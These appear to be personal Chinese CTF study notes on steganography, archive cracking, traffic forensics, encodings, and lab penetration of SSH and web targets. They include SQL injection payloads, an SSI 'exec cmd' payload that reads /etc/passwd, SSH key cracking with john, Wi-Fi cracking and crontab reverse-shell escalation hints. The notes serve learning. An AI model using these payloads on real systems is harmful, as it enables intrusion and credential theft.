00.思路
	1.要注意题目信息
	2.编码，进制，ascii十分常见
	3.要注意不常见字符串
	4.答案在前一定要多试几次
01.文件操作
	1.查看文件类型
		file chariot 
	2.文件分离
		分析
			1.binwalk filename
				decimal(10机制) 	hexadecimal(16进制)	descripition(描述)
		分离
			binwalk -e filename --run-as=root
			或
				2.foremost filename -o filename ( 默认当前目录)
			或
				3.手动分离：dd
					格式 dd if=源文件 of=目标文件名 bs=1 count=读取的数目 skip=跳过的的读写块
					结合binwalk使bs=1,count=总数，skip=新文件开头地址	使用十进制
				4.手动复制到其他文件分离：Winhex
	3.把16进制字符文件保存在一个文件
		010Editor:
			选择导入hex
			16进制：52617221是Rar压缩包
				选择另存为及对应累下去
			ctrl+shift+c:可复制16进制内容
	4、文件合并：
		linux:
			cat gif01 gif02 > 1.gif
			或
				cat gif* >1.gif	
			md5sum 文件名 产生对应MD5值
		windows:
			copy /B gif01+gif02 2.gif
			certutil -hashfile 文件名 md5
		注意查看文件类型，有时需要再文件开头加上对应格式开头
	5.文件隐写查找：
		key,flag搜索
		后
			16进制搜索
02.图片隐写术
	1.Firework：
		使用winhex打开文件可以看见文件头部包含firework的表示，通过firework可以找到隐藏图片
			可以用来查看图层和帧
				1.细微的颜色差别
				2.GIF图多帧隐藏
					1.颜色通道隐藏
					2.不网帧图信息隐藏
					3.不同帧对比隐写
		操作：
			导出所选帧
	2.Exif信息隐藏
		按照JPEG的规格在JPEG中插入一些图像/数字相机的信息数据以及缩略图像，	
			工具:
				windows:
					通过与JPEG兼容的互联网浏览器、图片浏览器、图像处理等软件查看Exif格式图像信息
					如同浏览器JPEG图片文件
				Linux：
					通过exif命令：exiftool 文件名
			方法：
				windows：
					右键属性查看exif详细信息，在相关选项卡查找flag信息
						详细信息：	
							标题
							GPS	
								通过谷歌地球查看经纬度或http://jingweidu.757dy.com/，
								单位:度（°），分（′），秒（″）
	3.Stegsolve
		作用：
			当两张jpg图片外观、大小、像素都基本相同时，可以考虑进行结合分析，即将两个文件的像素RGB
			值进行XOR、ADD、SUB(异或，加减)等操作，看能否得到有用的信息，StegSolve可以方便的进行这些操作。
			在不同通道会有隐藏显示
		使用场景：
			两张图片信息基本相同
		步骤：
			文本编辑器打开获取连接，下载第二张图片
			使用stegsolve打开文件，选择analysis选择image combiner,打开另一张
			补充：
				二维码边角方块中间是黑色的
				反射处理：黑白互换（使用图片修复的方法）
	4.最低有效位LSB隐写（Least Significant Bit）
		思想：
			使用嵌入的秘密信息取代载体图像的最低比特位，原7个高位平面
			与替代为秘密信息的最低位平面组合成含隐藏信息的新图像
		补充：
			三原色（RGB）
			修改像素中最低的1bit隐藏，可以八个色块，对于一个16位的ascii码值
			工具：
				stegsolve:(windows)
					1.打开文件>>Analyse>>Data Extract
					2.调整Bit Planes,Bit Order,Bit Plane Order
					或
						1.用画图转换为.png
						2.打开文件>>下方选择不同通道
				zsteg:(linux)
					1.detect stegano-hidden data in PNG & BMP
					2.Installation :	gem install zsteg
					3.检测LSB隐写(常用)	zsteg xxx.png
				wbstego4:
					适用：.bmp文件/.pdf文件
					使用：通过画图软件另存为.bmp文件,完成后使用16进制查看
				python脚本:
					使用：
						命令行到对应位置：python 对应python文件名
	5.图片修复
		工具：
			浏览器：
				有时图片看不清可以使用浏览器打开
			TweakPNG:
			介绍：
				PNG图形浏览工具，允许查看和修改PNG图文文件的元信息存储，如crc是否正确
			场景：
				文件头自带的高度错误或CRC错误，修改CRC为计算出的正确值
				图片无法预览显示，但可打开
			例子：
			补充：
				png图片以4bit：89 50 4E 47开头
				第二行前4bit是宽，后4bit是高
				一行是16bit，分四段
				crc:第二行后三个bit+第三行第一个bit
			使用：
				CRC校验修复:
					16进制编辑器打开，把对应crc位替换为正确值
				或
					计算高度：
						使用png.py脚本，更改对应文件名和crc值
						补充：
							更改宽度会使图片无法清晰显示，更改高度不影响清晰
	CQR.exe:二维码处理
		1.使用二维码扫描工具CQR.exe打开图片找到内容字段
		2.如果二维码某个定位角被覆盖了，该工具
		有时候也可以自动识别，如果识别失败，需
		要使用PS或画图工具将另外几个角的定位符
		移动到相应的位置，补全二维码。
		3.如果某个二维码的定位点中问是白色，可能被反色了，
		使用画图工具（或截屏软件）把颜色反色回来再扫描即可，
		包括：
			1.图片头修复
			2.图片尾修复
			3.CRC校验修复
			4.长、宽、高度修复
			5.二维码处理

	6.解密图片信息：
		工具：
			bftools用于解密图片信息
				场景：windows的cmd下，对加密过的图片文件解密
				使用步骤：
					把文件放到同级目录
					Bftools.exe decode braincopter 需解密图片名 -o 输出文件名
					Bftools.exe run 上一步输出文件
			SilentEye:
				解释：款可以将文字或者文件隐藏到图片的解密工具。
				场景：windows下打开silentEye工具，对加密的图片进行解密
				步骤：
					打开文件>>image>>decode>>可以查看隐写文件，点击保存即可
			Stegdetect：(linux)
				场景：用于分析jpeg文件，用于检查JSteg,jPHide,OutGuess,Invisble Secrets,FS,appendx,camouflage等工具隐写信息
				用法：
					stegdetect xxx.jpg
					stegdetect -s 敏感度(如10.0) xxx.jpgexi
				加密类型对应解密：
					Jphide:(windows)
						场景：
							stegdetect提示jphide加密时，可以用Jphs工具进行,
						操作：
							打开jphswin.exe>>open jpeg >>seek >>输入密码
					Outguess：(linux)（C语言）（jpeg）
						场景：是outguess加密的图片时
						使用：
							此工具需编译使用：./configure && make && make install
							格式：outguess -r 需解密文件名 输出文件名
							或：从源码编译安装（需 GCC）
								安装 GCC 编译环境
									sudo apt update
									sudo apt install -y build-essential gcc make libjpeg-dev
								下载 OutGuess 源码
									wget https://github.com/resurrecting-open-source-projects/outguess/archive/master.zip
									unzip master.zip
									cd outguess-master
								编译并安装
									./configure
									make
									sudo make install
								安装完成后，运行 
									outguess -h 检查是否成功
					F5：（windows）（java语言）
						场景：是F5加密的图片时 
						使用：
							进入F5-steganography_F5目录，将图片文件拷贝至该目录下，从CMD进入该目录
							格式：Java Extract 需解密文件名 -p 密码
							结果在目录下的output.tx中看到
	7.图片转编码
		1.黑对0白对1
		使用：
			picture_hide>>color_code.py
	8.Base64隐写：
		使用：b64.py解码
		字符转二进制
		char = 'A'
		binary_str = bin(ord(char))  # 转为二进制字符串
		print(binary_str)            # 输出: 0b1000001
		js:
		const char = 'A';
		const binaryStr = char.charCodeAt(0).toString(2).padStart(8, '0');
		console.log(binaryStr); // 输出: "01000001"
		二进制转十进制：
			parseInt(binaryStr, 2);



03.压缩文件处理
	1.伪加密：
		zip：
			如果压缩文件是加密的，或文件头正常但解压缩错误，首先尝试文件是否为伪加密，文件是否加密
			是通过标识符来是示的，在每个文件的文件口录字段有一位专们标识了文件是否加密，将其设置为00表示
			该文件未加密，如果成功解压则表示文件为伪加密，如果解压出错说明文件为真加密
			操作：
				文件搜索16进制：504B0102(504B0304*必改),后数4个bit后(14 00后),接下来两个bit改为00 00
				
		rar:
			RAR文件由于有头部校验，使用伪加密时打开文件会出现报错，使用winhex修改标惠位后如报错消失且
			正常解压缩，说明是伪加密，使用winhex打开RAR文件，找到第24个字节，该字节尾数为4表示加密，0表
			示无加密，，将尾数改为0即可破解伪加密。
			操作：	
				找到第二行第7列，尾数改为0
		补充：
			region(文件夹)
			level.dat
			session.lock
			是Minecraft（我的世界）的地图文件根目录
	2.暴力破解：
		ARCHPR.exe:(windows下zip)
			1、攻击类型：暴力破解，
				设置暴力破解包含的类型、开始于和结束于选项具体范围
				点击打开选择要破解的文件，点击
				开始进行破解。建议使用1~9位的数字密码，以及系
				统自带的英文字典作为密码字典
			2.攻击类型：掩码（复杂的暴力破解）
				比如知道密码前3位是abc，后3位为数字，则在攻
				击类型选择掩码，在掩码处输入acb??？，暴力范
				围选项选择所有数字，打开要破解的文件，点击
				破解。此时？？？的部分会被我们选择的暴力破
				解范围中的字符代替
			3.明文攻击：
				明文攻击指知道加密的ZIP中部分文件的明文内容，利用这些内容推测出密钥并解密ZIP文件的攻击方法，相比于
				暴力破解，这种方法在破解密码较为复杂的压缩包时效率更高。
				例子：
					设一个加密的压缩包中有两个文件readme.txt和flag.txt，其中flag.txt的内容是我们希望知道的内容，而我们拥有
					readme.txt的明文文件，使用上述两个文件即可进行明文攻击。
				操作：
					1、将readme.txt的明文文件进行压缩，变成readme1.zip。
					2、打开archpr，攻击类型选择明文，明文文件路径选择readme1.zip（即将明文文件不加密压缩后的文件），加密的文件
					选择要破解的文件，点击开始，破解成功后会获得密码。
				注意：
					1、有一个明文文件，压缩后CRC值与加密压缩包中的文件一致
					2、明文文件的压缩算法需要与加密压缩文件的压缩算法一致。
			4.有时不一定能破解出文件口令，但是能够找到加密密钥等信息，可以直接将文件解密，点击确定保存解密后的文件即
			可。(密钥就是flag)
		Ziperello:（zip解压缩）

	3.文件修复：
		rar:
			文件块的第3个字节为块类型，也叫头类型（0x74还原）可通过上个文件最后文本找文件块开始
				头类型是0x72表示是标记块
				头类型是0x73表示是压缩文件头块
				头类型是0x74表示是文件头块(把A8 3C 7A->A8 3C 74)7A->74
				头类型是0x75表示是注释头
			注意解压出文件类型调整
04.流量取证技术
	描述：
		通常比赛中会提供一个包含流量数据的PCAP文件，有时候也会需要选手们先进行修复或重构传输文件后，再进行分析。
	工具：
		wireshark(流量分析)
		通用：
			过滤：
				1.过滤IP:
					ip.src eq x.x.x.x or(and) ip.dst eq x.x.x.x 或者 ip.addr eq x.x.x.x
				2.过滤端口：
					tcp.port eq 80 or udp.port eg 80
					tcp.dstport == 80只显tcp协议的目标端口为80
					tcp.srcport == 80只显tcp协议的源端口为80
					tcp.port >= 1 and tcp.port <= 80
					补充：（常见端口及用途）
						21端口：FTP（文件传输协议），用于客户端和服务器之间的文件传输。
						22端口：SSH（安全外壳协议），用于安全的远程连接服务。
						23端口：Telnet（终端仿真协议），用于远程管理和控制设备。
						25端口：SMTP（简单邮件传输协议），用于电子邮件的发送。（是tcp一种）
						53端口：DNS（域名系统），用于将域名解析为IP地址。
						80端口：HTTP（超文本传输协议），用于浏览网页。
						161端口：SNMP（简单网络管理协议），用于网络设备的管理和监控
				3.过滤协议
					tcp/udp/arp/icmp/http/ftp/dns/ip
				4.过滤MAC
					eth.dst == A0:00:00:04:C5:84 过滤目标mac
				5.包长度过滤
					udp.length == 26这个长度是指udp本身固定长度8加上udp下面那块数据包之和。
					tcp.len >= 7指的是ip数据包(tcp下面那块数据),不包括tcp本身
					ip.1en == 94 除了以太网头固定长度14,其它都算是ip.len,即从ip本身到最后
					frame.1en == 119整个数据包长度，从eth开始到最后
				6.http模式过滤
					http.request.method"GET"
					http.request.method == "POST"
					http.request.uri == "/img/logo-edu.gif"
					http contains "GET"
					http contains "HTTP/1."
					http.request.method == "GET" && http contains "User-Agent:"
					http contains "flag"
					http contains "key"
					tcp contains "flag"
					tcp contains "command"
					http.time >=3
				7.某种特征的过滤：
					鼠标选中>>右键>>作为过滤器应用>>选中/非选中
				8.sql注入
					导出分组解析结果，->从大到小排序得到结尾值
				9.url解码把GET--http复制到url解码
			协议分析：
				英文版：Statistics →ProtocolHierarchy
				中文版：统计→协议分级
			流汇聚：
				右键>>追踪流>>对应流（follow stream）
				常见的HTTP流关键内容：
					1、HTML中直接包含重要信息
					2、上传或下载文件内容，通常包含文件名、hash值等关键信息常用POST请求上传
					3.一句话木马，POST请求，内容包含eval，内容使用basc64加密
			数据提取：
				自动提取：
					使用wireshark可以自动提取通过http传输的文件内容。
					方法：
						文件→导出对象→HTTP
				手动提取：
					wireshark可以手动提取文件内容。(Media Type)
						右键→导出分组字节流或者点击菜单栏文件→导出分组字节流，快捷方式Ctrl+H
						在弹出的框中将文件保存成二进制文件
			经验：
				有时flag藏在数据头里，编码(如base64)隐藏
		特殊：
			无线流量：
				无线流量包跑密码：协议分桥发现只有wireless LAN协议，提有可感是wPA或WEP加密的无线教量包
				工具：
						aircrack-ng工具进行wifi密码破解
						使用：
							1.用aircrack-ng检查cap包：aircrack-ng xxx.cap
							2.aircrack-ng跑字典进行握手包破解：aircrack-ng xxx.cap -w pass.txt
							3.BSSID（物理地址） ESSID（wifi地址）Encryption（编码）
				补充：
					wifi加密方式：WEP、WPA、WPA2（安全较高）
					kali Linux的字典文件位于/usr/share/wordlists/，可使用fern-wifi>common.txt,或如rockyou.txt
			USB流量：
					USB流量也是流量分析题的考查点，一般考察的流量涉及
					键盘击键，鼠标移动与点击，存储设备的明文传输通信，
					USB无线网卡网络传输内容等。
					键盘流量：
						分析：
							将Leftover Capture Data域的值在主面板上显示(通过数据里显示出后应用为列)
							键盘数据包的数据长度为8个字节（一个字节两个数字）：击键信息集中在第3个字节，
							每次key stroke都会产生一个
							keyboard event usb packet
						使用：
							方法1:文件->导出分组解析结果->为CSV
							方法2：
								1.tshark.exe -r usb1.pcap -T fields -e usb.capdata > usbdata.txt
								2.使用usb_wire>keyboard.py转为字符
						补充：
							pycharm格式化快捷键ctrl+alt+L
					鼠标流量：
						分析：
							鼠标流量与键盘流量不同，鼠标移动时表现为连续性，与键盘的离散性不一样，但是实际鼠标产生的数据
							是离散的。所以同样可以把数据抓取出来，构成二维坐标画出轨迹（单击左键、右键、不单击）。
							鼠标数据包的数据长度为4个字节：
								第一个字节代表按键，
									当取0x00时，代表没有按键；
									为0x01时，代表按左键，为0x02时，代表当前按键为右键
								第二个字节代表左右偏移：
									当值为正时，代表右移多少像素。当值为负时，代表左移多少像素。
								同理，第三个字节代表上下偏移
							操作：（windows）
								提取1.tshark.exe -r usb1.pcap -T fields -e usb.capdata > usbdata.txt
								调用python程序并输出结果：# python mouse.py > xy.txt
								linux用gnuplot工具把坐标画出来:gnuplot (切换命令行)
									plot "xy.txt"(调用)
					https:流量包文件分析
					HTTPS流量是经过TLS协议加密过的，需要导入key才能看到原始的HTTP流量。
						分辨：
							https(443)=	http(80)+TLS
						步骤：
							1.输入key
								英文版: Preferences -> Protocols -> SSL -> Edit RSA keys list
								中文版:编辑-> 首选项-> Prolocols -> SSL ->EdR RSA keys list
							2.显示出http
							3.追踪http流
					提取文件：
						binwalk分析
						提取：tshark -r Usb-probing.pcap -T fields -e usb.capdata|tr -d ':'|tr -d '\n'|grep "8950\w*" -o > raw
						还原为png图片（纯十六进制数据（由 -p 指定）转换为二进制格式）	xxd -p -r raw png
						提取长度大的文件

			补充：ascii
				  	console.log('A'.charCodeAt(0));  // 输出 65
  					console.log(String.fromCharCode(65));  // 输出 'A'
					python:
						命令行:python(进入python)->char(97):a	ord('a'):97
				16进制的ascii码：因为最后一个是7D，在ascii中为‘}’,对应125;‘{’对应123
				图片长度爆破要多尝试，
				两张同样图片是对比；还是打掩护，需要图片解密看具体信息
	·总体把握
		·协议分级
		·端点统计
	·过滤筛选
		·过滤语法
		Host，Protocol，contains，特征值
	·发现异常
		特殊字符串
		协议某字段
		·flag 位于服务器中
	·数据提取
		。字符串取
		文件提取
	总的来说比赛中的流量分析可以概括为以下三个方向：
		·流量包修复
		·协议分析
		·数据提取
05.密码学
	密码学：古典->近代->现代->公式
		对称密码算法(Symmetriccipher):(加密效率高)
			加密密钥和解密密钥相同，或实质上等同，即从一个易于
			推出另一个。又称传统密码算法（Conventionalcipher)、秘密密钥算法或单密钥算法。
			如:
				·DES、3DES、IDEA、AES(最强算法难破解),
		·非对称密码算法(Asymmetriccipher)：
			加密密钥和解密密钥不同，丛一个很难推出另一个
			又叫公钥密码算法(Public-keycipher)。其中的加密密钥可以公开，称为公开密钥（publickey），简
			称公钥；解密密钥必须保密，称为私人密钥月(private key)，简称私钥。
			如:
				·RSA(常考，费马定理)、ECC、EIGamal
		
	编码：字典的方式
		ASCII码：
			来源：
				ASCII码使用指定的7位或8位二进制数组合来表示128或256种可能的字符
				标准ASCII码也叫基础ASCII码，使用7位二进制数（剩下的1位二进制为0）
				来表示所有的大写和小写字母，数字0到9、标点符号，以及在美式英语中使
				用的特殊控制字符
			工具：
				（文件夹）ctf工具包>密码学:
					小葵
					米特斯
					密码机器(离线可用)
		Base64编码：
			编码原理：
				3*8=4*6->4*8
				两数字一组转二进制是->8位；分成4个六位；头两位补零；成4个八位；根据编码表编码
			特点：编码后会有一个或两个等号,有时候需要补充等号，填充后原始数据长度要是3的倍数
			编码表：查看文件：文件头类型.docx
		url编码：
			编码原理：
				url编码就是一个字符ascii码的十六进制。 不过稍微有些变动， 需要在前面加上“%”。
				比如“\”，它的ascii码是92, 92的十六进制是5c, 所以 "\” 的url编码就是%5c。
			特点：密码中有多个%号符
			在线网页：https://tool.oschina.net/encode?type=2	(在线编码转换)
		Unicode编码：
			编码原理：
				扩展自ASCII字元集。在严格的ASCII中，每个字元用7位元表示，或者电脑上普遍使用的每字元有
				8位元宽;而Unicode使用全16位元字元集。这使得Unicode能够表示世界上所有的书写语言中可能用于电脑通讯
				的字元、象形文字和其他符号。
			特点：密码中有多个:\uxxx
			在线网页： http://tool.chinaz.com/Tools/Unicode.aspx
			补充：
				UTF-8是中文3到4字节
				GBK是中文2字节
		js:利用浏览器将16进制转换为命令
			<script>
			eval("\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3b");
			</script>
			只要将命令转16进制放入eval就可以了
	数据摘要:
		数据摘要算法是密码学算法中非常重要的一个分支，它通过对所有数据提取指纹信息以实现数据签名、数据完
		整性校验等功能，由于其不可逆性，有时候会被用做敏感信息的加密。数据摘要算法也被称为哈希（Hash）算法
		、散列算法，常见的摘要算法有MD5和SHA
		在互联网上进行大文件传输时，都要得用MD5算法产生一个与文件匹配的、存储MD5值的文本文件（后缀名
		为.md5或.md5sum），这样接收者在接收到文件后，就可以利用与SFV类似的方法来检查文件完整性，绝大多
		数大型软件公司或开源组织都是以这种方式来校验数据完整性，而且部分操作系统也使用此算法来对用户密码进
		行加密，另外，它也是目前计算机犯罪中数据取证的最常用算法。
		SHA中SHA1的应用较为广泛，主要应用于CA和数字证书中，另外在互联网中流行的BT软件中，也是使用
		SHA1来进行文件校验的，由于SHA系列算法的数据摘要长度较长，因此其运算速度与MD5相比，也相对较慢。
06.mysql
	linux下：
		strings ib_logfile0 | grep "flag"
07.SSH私钥泄密
	如何从外部进入最终root主机，取得flag?
		步骤：
			1.信息探测
				对于只是给定一个对应IP地址的靶场机器，我们需要用对其
				进行扫描，探测开放的服务。

				渗透其实是针对服务的漏洞探测，然后进行对应的数据包发
				送，获取机器的最高权限

				kali：nmap -sV 192.168.253.10   挖掘开放服务信息
			2.探测大端口的信息
				对于开放http服务的大端口，可以采取http://ip:port/
				的形式访问;

				查看源代码获取对应信息；如果没有flag信息，使用工
				具探测隐藏页面

				kali: dirb http://ip:port/ 对这个服务的隐藏文件进行探测
			3.针对隐藏页面分析
				直接使用浏览器访问，查看效果、对应源代码
				可能会获取到flag，或者下一步对应的提示；

				挖掘ssh信息，不断访问获取更多泄露的ssh秘钥信息
			4.解密ssh秘钥信息
				使用 ssh2john 将id_isa秘钥信息转换为john可以识别的信息。
				chmod 600 id_isa
				ssh2john id_isa > isacrack
				利用字典解密isacrack信息
					zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules isacrack
					密码：629/s 8362c/s83620/s stanars(密码)
			5.使用获取信息登录
				ssh -i id_rsa(私钥文件) simon(用户名)@192.168.253.(靶机ip)
				到这里登录到主机，但是并不是root权限？该如何获取呢？
			6.深入探测根目录
	补充：
		CTF比赛中，比赛环境的两种方式
			1.给予在同一局域网中的攻击机和靶场机器，以web方式可以访问攻击
			机，通过攻击机来渗透靶场机器，获取对应的flag值；（一般情况下给
			于kali linux作为攻击机，并且举办方提供计算机）
			2.给予一个网线接口，用户自备工具，直接连接网线，进行渗透靶场机
			器，获取对应的flag值;
		分析探测结果
			每一个服务对应计算机的一个端口，用来进行通信。常用端
			口0~1023端口，在扫描结果中查找特殊端口
			针对特殊端口进行探测，尤其对开发大端口的http服务进行
			排查；
		robots.txt:浏览器默认访问存贮，哪些可以访问哪些隐藏的信息
		SSH:
			私钥文件：{"id_rsa","authorized_keys","id_rsa.pub"}
				id_rsa
				authorized_keys
				使用目录访问下载
			使用私钥登录：
				ssh -i id_rsa(私钥文件) simon(用户名)@192.168.253.(靶机ip)
		kali里链接可右键打开
		Linux命令：
			赋予私钥文件读写权限： chmod 600 id_rsa
				权限：
					每位含义
						权限的粒度有 拥有者 、群组 、其它组 三种。每个文件都可以针对三个粒度；
					数字含义：
						我们规定 数字 4 、2 和 1表示读、写、执行权限（具体原因可见下节权限详解内容）
						，即 r=4，w=2，x=1 。此时其他的权限组合也可以用其他的八进制数字表示出来，
							如：
							rwx = 4 + 2 + 1 = 7
							rw = 4 + 2 = 6
							rx = 4 +1 = 5
			/bin/sh：(在/目录执行)
				本质上是一种命令行解释器，它充当用户与操作系统内核之间的接口。
				用户可以通过/bin/sh输入命令来控制系统行为，执行各种任务。它能够解释用户输入的命令并执行相应的操作
				可利用超出数组范围实现执行之后命令，实现提权
				exit：退出
			find / -perm -4000 2>/dev/null:查找具有root权限的文件
				根据代码审计结果，得到flag，以及提升权限
			根目录：cd /root
			输出文件内容：cat flag.txt
08.SSH服务渗透
	步骤：
		目标：如何从外部进入最终root主机，取得flag
		信息探测：
			对于给定IP地址的靶场机器，对其进行渗透测试，首先需要考虑靶场机器开放的服务。
			探测靶场开放的服务与服务的版本
			-- nmap -sV 靶场IP地址

			探测靶场全部信息
			--nmap -A -v 靶场IP地址

			探测靶场的操作系统类型与版本
			--nmap -O 靶场IP地址
		分析探测结果
			对于SSH服务的22端口的靶场
				首先考虑
				1、暴力破解
				2、私钥泄露露（私钥有没有对应的密码、是否可以找到私钥的用户名）
			对于开放http服务的80端口或者其他端口的靶场
				首先考虑
				1、通过浏览器访问对应的靶场http服务，如http://靶场IP地址:http服务端口
				2、使用探测工具对htp的目录进行探测，如dirb http://靶场ip地址:http服务端口/
			特别注意特殊端口（大于1024的端口）它是否开放http服务
		挖掘敏感信息
			使用浏览器对靶场IP的htp服务探测，对页面中展示的内容也要注意，尤其是联系人等信息（有可能就
			是ssh的用户名信息） ，递归访问，力争把每一个dirb扫描到的目录页面都访问查看;
			尤其对robots.txt、以及一些目录进行访问，挖掘具备利用价值的信息。对于开放ssh服务的靶场，务必
			要注意是否可以寻找到ssh私钥信息(id_rsa);
			对于某些靶场，也可以使用nikto扫描器来挖握敏感信息
			nikto -host 靶场IP地址
			特别注意confg等特殊敏感文件，要细读扫描的结果，挖提可以利用的敏感信息：
		利角敏感、弱点信息
			对挖掘到的ssh密钥利用
			1、修改id_rsa的权限
			chmod 600 id_rsa
			2、利用私钥登陆服务器
			ssh -i id_rsa 用户名@靶场ip地址
		扩大战果
			登录服务器之后，我们需要做以下操作。
				1、查看当前用户whoami
				2、id 查看当前用户的权限
				3、查看根目录寻找flag文件
			如果是root权限，那么表明这个靶场就被全部拿下。但是如果不是，就肯定需要提权。
			一般情况下，flag文件只属于root用户和对应的用户组
			cat /etc/passwd 查看所有用户的列表
			cat /etc/group 查看用户组
			find / -user 用户名 查看属于某些用户的文件
			cd /tmp;ls -all 查看缓冲文件目录
		深入挖掘
			通过 /etc/crontab 文件，设定系统定期执行的任务，编辑，需要root权限。 不同的用户都可以有不同的定
			时任务
			cat /etc/crontab 挖掘其他用户是否有定时任务，并查看对应的任务内容。执行的任务肯定对应靶场机器
			的某个文件。
			如果在/etc/crontab下有某个用户的定时计划文件，但是具体目录下没有这个定时执行的文件，可以白
			行创建反弹shell，然后netcat执行监听获取对应用户的权限。
			如果有定时执行的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否具有读写权限。
		
	补充：
		命令：
			从网页下载文件命令(linux)：
				wget "网址"
			重命名文件：
				mv 源文件 重命名后文件
			查看所有文件：
				ls -all
			find:
				按文件名
					find 路径 -name "文件名"
		cat /etc/passwd结果介绍：
			每一行代表一个用户，“：”分割字段；
			字段含义
				用户名		用户登录系统时使用的用户名
				密码		密码位
				UID			用户标识号
				GID			缺省组标识号
				注释性描述	例如存放用户全名等信息
				宿主目录	用户登录系统后的缺省目录
				命令解释器	用户使用的Shell，默认为bash
			得到用户数：
				cat /etc/passwd | wc -l
		cat /etc/group结果介绍：
			linux用户组的所有信息都存放在/etc/group文件中。
			用户组（Group）配置文件主要有 /etc/group和/etc/gshadow，
			其中/etc/gshadow是/etc/group的加密信息文件。
			格式：	组名:口令:组标识号:组内用户列表
			字段：
				1.组名
				组名是用户组的名称，由字母或数字构成。与/etc/passwd中的登录名一样，组名不应重复。。
				2.口令
				口令字段存放的是用户组加密后的口令字。一般Linux系统的用户组都没有口令，即这个字段一般为空，或者是*。。
				3.组标识号
				组标识号与用户标识号类似，也是一个整数，被系统内部用来标识组。别称GID。
				4.组内用户列表
				是属于这个组的所有用户的列表，不同用户之间用逗号(,)分隔。这个用户组可能是用户的主组，也可能是附加组
		得到行数：
			shell复制代码
				find /path/to/directory -type f -exec cat {} + | wc -l
			这个命令将会：
				1.使用find命令查找指定目录下的所有文件。
				2.使用-execcat+将找到的文件内容传递给cat命令进行合并。
				3.将合并后的文件内容传递给wc -l命令来统计行数
			这样，你就可以得到目录下所有文件的总行数。
		目的：获取靶场机器上的flag值;
		SSH协议介绍：
			SSH为建立在应用层基础上的安全协议。
			基于TCP22号端口的服务
		SSH协议认证机制：
			基于口令的安全验证
				只要你知道自己帐号和口令，就可以登录到远程主机。所有传输的数据都会被加密，
				但是不能保证你正在连接的服务器就是你想连接的服务器。可能会有别的服务器在冒充真正的服务器，也就是
				受到“中间人”这种方式的攻击。
			或
				基于密匙的安全验证
					需要依靠密匙，也就是你必须为自已创建一对密匙，并把公用密匙放在需要访问的服务器上。
					如果你要连接到SSH服务器上，客户端软件就会向服务器发出请求，请求用你的私有密匙进行安全
					验证。服务器收到请求之后，先在该服务器上你的主目录下寻找你的公用密匙，然后把它和你发送
					过来的私有密匙进行比较。如果两个密匙一致，则验证成功，登陆服务器。
					补充：
						id_rsa就是你的私钥，而而id_rsa.pub则是你的公钥
		SSH协议验证机制弱点：
			基于口令的安全验证
				基于字典的暴力破解，破解对应用户名和密码，通过SSH客户端连接到远程主机的SSH服务，
				实现对服务器的一定控制。(不一定是root权限)
			基于密钥的安全验证:
				通过对主机信息收集，获取到泄露的用户名和对应的密钥
				chmod 600 id_rsa
				ssh -i id_rsa 用户名@主机地址(登陆服务器。)(不一定是root权限)
09.sql注入
	目标：如何从外部进入最终root主机，取得flag
	介绍：
		高危漏洞：可以直接获取服务器权限。
		攻击方式：
			输入SQL语法里的一些组合，传入web应用程序,
			通过执行SQL语句进而执行攻击者所要的操作
		漏洞来源：
			输入：
				不合理的查询集处理
				多个提交处理不当。
			配置：1.不安全的数据库配置	2.不当的错误处理
				3.不当的类型处理；		4.转义字符处理不合适
	操作：
		使用浏览器打开 http://ip:port/敏感页面，查看敏感信息，找到可利用的位置；
			可使用弱口令试一下：
				admin admin
	工具：
		web漏洞扫描器owasp-zap:
			介绍：
				攻击代理服务器；自动发现Web应用程序中的安全漏洞
			操作：
				在kali工具栏(web application Analysis)
				打开输入目标ip即可
				完成后在：
					alots显示
					颜色由深到浅：危险等级由高到低
		漏洞扫描器：AVWS(电脑搜：wvs_)
			介绍：web安全的漏洞扫描器。
			使用步骤：
				打开https://localhost:3443/
				输入正常邮箱，密码
				输入路径探测即可


	命令：
		扫描主机服务信息以及服务版本：
			命令：nmap -sV  -p 端口 靶场Ip地址
			参数：s:扫描	v:版本
		快速扫描主机全部信息：
			命令：nmap	-T4	-A	-v  -p 端口 靶场IP地址
			参数：T4：最大功率	-A 启动所以扫描选项 -v 打印详细信息
		探测敏感信息:
			命令： 
			nikto -host http://靶场ip地址:端口
			dirb http://靶场ip地址:端口
		sql注入命令：
			url要带注入参数如：?id=3
			使用sqlmap探测漏洞是否可用：sqlmap url
			使用注入命令：kali_way.txt->sqlmap渗透数据库(kali)
			手动命令：
				1' order by 3 	--用于探测列数如果报错说明2列
				-1' union select 1,databases #	--1是占位拼成两列调用函数查数据库
				-1'; show databases; #	--同样用于探测数据库
				-1';use supersqli;show tables;#		--用于查看表
				 -1';use supersqli;show columns from `1919810931114514`;#    --用于查看列
				 -1';use supersqli;handler `1919810931114514` open as p;handler p read first; 	--查看数据
		(SSL注入漏洞)获得shell:kali_way.txt->msf反弹连接获得shell
		查看开放端口:namp 本机ip
			netstat -tuln 可显示所有监听状态的TCP和UDP端口，
				参数说明：-t（TCP端口）、-u（UDP端口）、-l（仅显示监听端口）、-n（以数字形式显示端口号）
			netstat -pantu 
				该命令会列出系统中所有活动的 TCP 和 UDP 连接，包括本地地址、远程地址、连接状态等信息，帮助用户快速了解当前网络通信情况。
			补充：ESTABLISHED指建立连接的稳定状态
	SSL注入漏洞
		介绍：
			如果再网站目录中发现了`.stm；.shtm；.shtml；`这样的文件后缀名，
			并且网站对于SSI的输入没有做到严格过滤或者过滤不充分；很有可能被SSI注入攻击。
		方式：
			SSI语法
				①显示服务器端环境变量<#echo>
				本文档名称：
				<!–#echo var="DOCUMENT_NAME"–>
				现在时间：
				<!–#echo var="DATE_LOCAL"–>
				显示IP地址：
				<! #echo var="REMOTE_ADDR"–>
				②将文本内容直接插入到文档中<#include>
				<! #include file="文件名称"–>
				<!--#include virtual="index.html" -->
				<! #include virtual="文件名称"–>
				<!--#include virtual="/www/footer.html" -->
				注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径
				③显示WEB文档相关信息<#flastmod><#fsize>(如文件制作日期/大小等)
				文件最近更新日期：
				<! #flastmod file="文件名称"–>
				文件的长度：
				<!–#fsize file="文件名称"–>
				④直接执行服务器上的各种程序<#exec>(如CGI或其他可执行程序)
				<!–#exec cmd="文件名称"–>
				<!--#exec cmd="cat /etc/passwd"-->
				<!–#exec cgi="文件名称"–>
				<!--#exec cgi="/cgi-bin/access_log.cgi"–>
				列举当前目录中的文件和目录
